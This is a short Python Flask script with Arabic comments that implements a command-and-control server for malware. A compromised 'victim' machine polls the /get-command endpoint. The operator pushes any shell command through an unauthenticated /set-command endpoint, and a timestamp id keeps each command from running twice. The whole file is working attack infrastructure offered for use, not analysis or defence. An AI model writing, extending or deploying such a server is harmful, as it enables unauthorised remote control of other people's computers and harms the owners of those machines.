from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# متغير لتخزين الأمر الحالي (افتراضياً لا يوجد أمر)
# نضع فيه الوقت 'timestamp' لمنع التكرار عند الضحية
current_command = {
    "cmd": "WAIT", 
    "id": str(int(time.time())) 
}

# 1. المسار الذي يراقبه الضحية (الضحية يرسل GET هنا)
@app.route('/get-command', methods=['GET'])
def get_cmd():
    return jsonify(current_command)

# 2. المسار الذي تستخدمه أنت لإرسال أمر جديد
# مثال للرابط: /set-command?c=dir
@app.route('/set-command', methods=['GET'])
def set_cmd():
    cmd_text = request.args.get('c', 'WAIT')
    global current_command
    current_command = {
        "cmd": cmd_text,
        "id": str(int(time.time())) # رقم فريد يعتمد على الوقت لمنع التكرار
    }
    return f"Done! Command updated to: {cmd_text} with ID: {current_command['id']}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
